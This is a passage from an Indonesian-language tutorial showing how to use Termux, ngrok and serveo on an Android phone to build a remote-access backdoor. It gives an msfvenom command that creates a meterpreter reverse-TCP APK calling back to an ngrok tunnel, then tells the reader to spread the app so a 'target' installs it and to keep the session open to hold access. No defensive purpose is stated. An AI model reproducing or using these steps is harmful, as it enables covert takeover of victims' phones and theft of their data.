## Buat Akun Ngrok Termux

7. Buka aplikasi browser yang ada di hp android kamu dan buka situs *ngrok.com*.
8. Jika belum daftar, maka kamu bisa daftar dahulu dan buka dashboard ngrok, lalu salin kode perintah di nomor 3. Kurang lebih seperti ini  *$ ./ngrok authoken 89TLxPaUgR5AP*.
9. Pastekan kode yang sudah kamu salin tadi ke aplikasi  Termux kamu dilanjutkan dengan memasukan kode perintah di bawah ini:

`./ngrok tcp 1337`

10. Agar login bisa terhubung, maka kamu bisa gunakan VPN dengan menggunakan aplikasi VPN seperti Super VPN, HMAVPN, atau lainnya. atau tanpa aplikasi.
11. Buka new session lagi atau tab baru pada termux dan masukan kode perintah di bawah ini:

`Termux-setup-storage`

`Msfvenom –p android/meterpreter/reverse_tcp  
LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdoor.apk`

Pada LPORT kamu isi sesuai dengan port yang ada di bagian samping ***0.tcp.ngrok.io***.

12. Tunggu hingga proses sampai selesai.
13. Jika proses sudah selesai, maka kamu tinggal sebar aplikasinya ke target supaya target install aplikasi tersebut di hp android miliknya.

Perlu diingat, sebelum target memasang backdoor, Anda tidak boleh close aplikasi Termux agar tidak kehilangan akses.

Untuk mengatasi hal tersebut Anda bisa install serveo di  Termux Anda.

## Install Serveo Termux

Berikut langkah menginstall serveo:

`$ pkg install openssh`

Untuk mengoperasikan seveo gunakan perintah:

`$ ssh-R 80:localhost:8888 serveo.net`

Bagian “**80**” merupakan port forwarding, sedangkan “**8888**” adalah local port.

Nantinya Anda akan mendapat respon seperti:

*“hi there forwarding HTTP traffic from https://random.serveo.net press g to start a GUI session and ctrl-c to quit”*

Itu artinya proses install serveo sudah selesai, dan bisa langsung Anda gunakan.

Sekarang perlu tau cara agar bisa kembali terhubung ke serveo.

## Cara Kembali Terhubung Serveo

Silahkan ganti perintah:

`$ ssh –R 80:localhost:80 serveo.net`

menjadi,

`$ ssh –R ac10:localhost:80 serveo.net`

Lalu ganti bagian “**\*\*ac10\*\***” yang nantinya akan menjadi host. Sedangkan local port bisa ubah dengan 4 angka lain.
